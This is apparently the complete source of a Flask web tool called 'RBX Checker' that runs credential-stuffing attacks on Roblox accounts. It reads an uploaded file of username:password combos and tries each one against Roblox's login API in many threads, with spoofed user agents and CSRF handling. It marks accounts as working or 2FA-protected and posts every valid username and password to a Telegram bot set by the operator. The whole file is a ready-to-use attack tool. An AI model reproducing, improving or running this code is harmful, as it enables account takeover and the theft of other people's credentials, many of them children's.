import os
import time
import threading
from queue import Queue, Empty

import requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO
from user_agent import generate_user_agent

app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

STATE = {
    "running": False,
    "stats": {"hits": 0, "bad": 0, "2fa": 0, "total": 0, "processed": 0},
    "logs": [],
    "bot_token": "",
    "chat_id": "",
    "workers": 20
}
LOCK = threading.Lock()
STOP_FLAG = threading.Event()

def log(line: str):
    entry = f"[{time.strftime('%H:%M:%S')}] {line}"
    with LOCK:
        STATE["logs"].append(entry)
        if len(STATE["logs"]) > 300:
            STATE["logs"] = STATE["logs"][-300:]
    socketio.emit("log", {"line": entry})
    socketio.emit("stats", STATE["stats"])

def send_telegram(text):
    token, chat = STATE["bot_token"], STATE["chat_id"]
    if not token or not chat:
        return
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        requests.post(url, json={
            "chat_id": chat, 
            "text": text, 
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=5)
    except Exception:
        pass

def check_roblox(username, password):
    s = requests.Session()
    s.headers.update({"User-Agent": generate_user_agent()})
    try:
        r = s.post("https://auth.roblox.com/v2/login", timeout=10)
        csrf = r.headers.get("x-csrf-token")
        if not csrf:
            return None
        
        login_data = {"ctype": "Username", "cvalue": username, "password": password}
        r = s.post("https://auth.roblox.com/v2/login", json=login_data, headers={"x-csrf-token": csrf}, timeout=10)
        
        if r.status_code == 200:
            return {"username": username, "password": password, "profile": f"https://www.roblox.com/users/profile?username={username}"}
        
        if r.status_code == 403 and "twoStepVerificationRequired" in r.text:
            return {"username": username, "password": password, "profile": f"https://www.roblox.com/users/profile?username={username}", "2fa": True}
            
        return None
    except Exception:
        return None

def worker(combo_queue):
    while not STOP_FLAG.is_set():
        try:
            combo = combo_queue.get_nowait()
        except Empty:
            return
        
        with LOCK:
            STATE["stats"]["processed"] += 1
            
        try:
            if ":" not in combo:
                combo_queue.task_done()
                continue
            username, password = combo.split(":", 1)
        except ValueError:
            combo_queue.task_done()
            continue
            
        result = check_roblox(username.strip(), password.strip())
        
        with LOCK:
            if result:
                if result.get("2fa"):
                    STATE["stats"]["2fa"] += 1
                else:
                    STATE["stats"]["hits"] += 1
            else:
                STATE["stats"]["bad"] += 1
                
        if result:
            status = "2FA (Valid)" if result.get("2fa") else "HIT (Working)"
            log(f"{status} → {username}:{password}")
            
            # تصميم رسالة البوت بشكل جميل
            msg = f"""<b>✅ ROBLOX {status}!</b>

👤 <b>User:</b> <code>{result['username']}</code>
🔑 <b>Pass:</b> <code>{result['password']}</code>
🔗 <a href="{result['profile']}">View Profile</a>

<i>Sent by ALPHA XK Checker</i>"""
            send_telegram(msg)
        else:
            log(f"BAD → {username}")
            
        socketio.emit("stats", STATE["stats"])
        combo_queue.task_done()

def run_checker(combos, workers):
    with LOCK:
        STATE["stats"] = {"hits": 0, "bad": 0, "2fa": 0, "total": len(combos), "processed": 0}
    STATE["running"] = True
    STOP_FLAG.clear()
    combo_q = Queue()
    
    for c in combos:
        combo_q.put(c)
        
    # إشعار بدء التشغيل في البوت
    send_telegram(f"<b>🚀 بدأ الصيد!</b>\n\n📁 <b>عدد الحسابات:</b> <code>{len(combos)}</code>\n⚙️ <b>الثريدات (Workers):</b> <code>{workers}</code>")
    
    log(f"بدأ الفحص لـ {len(combos)} حساب...")
    threads = []
    for _ in range(min(workers, max(1, len(combos)))):
        t = threading.Thread(target=worker, args=(combo_q,), daemon=True)
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
        
    STATE["running"] = False
    log(f"خلصنا! صيد: {STATE['stats']['hits']} | 2FA: {STATE['stats']['2fa']} | خربان: {STATE['stats']['bad']}")
    
    # إشعار انتهاء التشغيل
    send_telegram(f"<b>🏁 انتهى الصيد!</b>\n\n✅ <b>Hits:</b> {STATE['stats']['hits']}\n🔒 <b>2FA:</b> {STATE['stats']['2fa']}\n❌ <b>Bad:</b> {STATE['stats']['bad']}")

INDEX_HTML = r"""<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RBX Checker</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
  :root { --bg:#0a0e0a; --fg:#39ff14; --dim:#1a3a1a; --panel:#0d140d; }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--fg); font-family:"Courier New",monospace; }
  .wrap { max-width:800px; margin:0 auto; padding:20px; }
  h1 { font-size:20px; text-align:center; margin-bottom:20px; text-shadow: 0 0 10px var(--fg); }
  
  .settings { display:flex; gap:10px; margin-bottom:15px; flex-wrap:wrap; }
  .settings input, .settings select {
    background: var(--panel); border: 1px solid var(--dim); color: var(--fg);
    padding: 10px; border-radius: 5px; font-family: inherit; flex: 1;
  }
  .settings input:focus, .settings select:focus { outline: none; border-color: var(--fg); }

  .upload-box {
    border: 2px dashed var(--dim); padding: 30px 20px; text-align: center;
    border-radius: 8px; margin-bottom: 20px; cursor: pointer; transition: 0.3s;
    display: block; width: 100%; background: var(--panel);
  }
  .upload-box:hover { border-color: var(--fg); background: rgba(57, 255, 20, 0.05); }
  .upload-box input[type="file"] { display: none; }
  .upload-box span { font-size: 16px; pointer-events: none; display: block; color: #aaa; }
  .upload-box:hover span { color: var(--fg); }

  .stats { display:grid; grid-template-columns:repeat(4,1fr); gap:10px; margin-bottom:20px; }
  .stat { border:1px solid var(--dim); padding:10px; text-align:center; border-radius:5px; background: var(--panel); }
  .stat b { display:block; font-size:22px; margin-top:5px; }
  .stat.hits b { color: var(--fg); text-shadow: 0 0 5px var(--fg); }
  .stat.bad b { color: #ff4444; }

  .term {
    background:#000; border:1px solid var(--dim); padding:15px;
    height:300px; overflow-y:auto; font-size:13px; line-height:1.6;
    white-space:pre-wrap; word-break:break-all; border-radius:5px;
  }
  .hit { color:var(--fg); font-weight:bold; }
  .bad { color:#ff4444; opacity: 0.7; }
  .sys { color:#00ffff; }
</style>
</head>
<body>
<div class="wrap">
  <h1>▶ RBX CHECKER</h1>
  
  <div class="settings">
    <input type="password" id="bot_token" placeholder="Bot Token (تيليجرام)">
    <input type="text" id="chat_id" placeholder="Chat ID (المعرف)">
    <input type="number" id="workers" value="20" min="1" max="100" style="max-width:80px;" title="عدد الثريدات">
  </div>

  <label class="upload-box" id="drop-zone">
    <input type="file" id="file-input" accept=".txt">
    <span id="upload-text">📁 اضغط هنا لاختيار ملف الكومبو وبدء الصيد فوراً</span>
  </label>

  <div class="stats">
    <div class="stat">Total <b id="s-total">0</b></div>
    <div class="stat">Processed <b id="s-proc">0</b></div>
    <div class="stat hits">Hits <b id="s-hits">0</b></div>
    <div class="stat bad">Bad <b id="s-bad">0</b></div>
  </div>

  <div class="term" id="term">> بانتظار الملف...<br>> تأكد من وضع التوكن والايدي فوق قبل رفع الملف.</div>
</div>

<script>
const socket = io();
const term = document.getElementById("term");
const fileInput = document.getElementById("file-input");
const uploadText = document.getElementById("upload-text");

function append(cls, text) {
  const div = document.createElement("div");
  div.className = cls;
  div.textContent = text;
  term.appendChild(div);
  term.scrollTop = term.scrollHeight;
}

fileInput.addEventListener("change", async (e) => {
  const file = e.target.files[0];
  if (!file) return;
  
  const token = document.getElementById("bot_token").value.trim();
  const chat = document.getElementById("chat_id").value.trim();
  const workers = parseInt(document.getElementById("workers").value) || 20;
  
  if (!token || !chat) {
    append("bad", "!! تنبيه: ما حطيت التوكن أو الايدي، البوت ما راح يرسل النتائج.");
  }

  uploadText.textContent = "⏳ جاري رفع الملف وبدء الصيد...";
  append("sys", `> تم اختيار الملف: ${file.name} (${Math.round(file.size / 1024)} KB)`);
  
  const formData = new FormData();
  formData.append("file", file);
  formData.append("bot_token", token);
  formData.append("chat_id", chat);
  formData.append("workers", workers);
  
  try {
    const r = await fetch("/api/upload", { method: "POST", body: formData });
    const j = await r.json();
    if (j.ok) {
      uploadText.textContent = "✅ جاري الصيد الآن...";
      append("sys", `> السيرفر قرأ الملف (${j.total} حساب) وبدأ الشغل.`);
    } else {
      append("bad", "!! خطأ: " + j.error);
      uploadText.textContent = "❌ فشل الرفع، جرب مرة ثانية";
    }
  } catch (err) {
    append("bad", "!! فشل الاتصال بالسيرفر");
    uploadText.textContent = "❌ خطأ في الاتصال";
  }
});

socket.on("log", d => {
  let cls = "";
  if (d.line.includes("HIT") || d.line.includes("2FA")) cls = "hit";
  if (d.line.includes("BAD")) cls = "bad";
  append(cls, d.line);
});

socket.on("stats", s => {
  document.getElementById("s-total").textContent = s.total;
  document.getElementById("s-proc").textContent = s.processed;
  document.getElementById("s-hits").textContent = s.hits + s["2fa"];
  document.getElementById("s-bad").textContent = s.bad;
  
  if (s.processed >= s.total && s.total > 0) {
    uploadText.textContent = "✅ خلص الصيد! تقدر ترفع ملف جديد.";
  }
});
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/api/upload", methods=["POST"])
def api_upload():
    if STATE["running"]:
        return jsonify({"ok": False, "error": "الفحص شغال حالياً، انتظر يخلص"}), 400
        
    if "file" not in request.files:
        return jsonify({"ok": False, "error": "ما وصل ملف"}), 400
        
    file = request.files["file"]
    if file.filename == "":
        return jsonify({"ok": False, "error": "اسم الملف فاضي"}), 400
        
    # استقبال الإعدادات من المتصفح
    STATE["bot_token"] = request.form.get("bot_token", "")
    STATE["chat_id"] = request.form.get("chat_id", "")
    workers = int(request.form.get("workers", 20))
        
    try:
        content = file.read().decode("utf-8", errors="ignore")
        combos = [line.strip() for line in content.splitlines() if ":" in line]
        
        if not combos:
            return jsonify({"ok": False, "error": "الملف فاضي أو مافيه صيغة صحيحة (user:pass)"}), 400
            
        # بدء الفحص في الخلفية
        threading.Thread(target=run_checker, args=(combos, workers), daemon=True).start()
        return jsonify({"ok": True, "total": len(combos)})
        
    except Exception as e:
        return jsonify({"ok": False, "error": f"خطأ في قراءة الملف: {str(e)}"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)
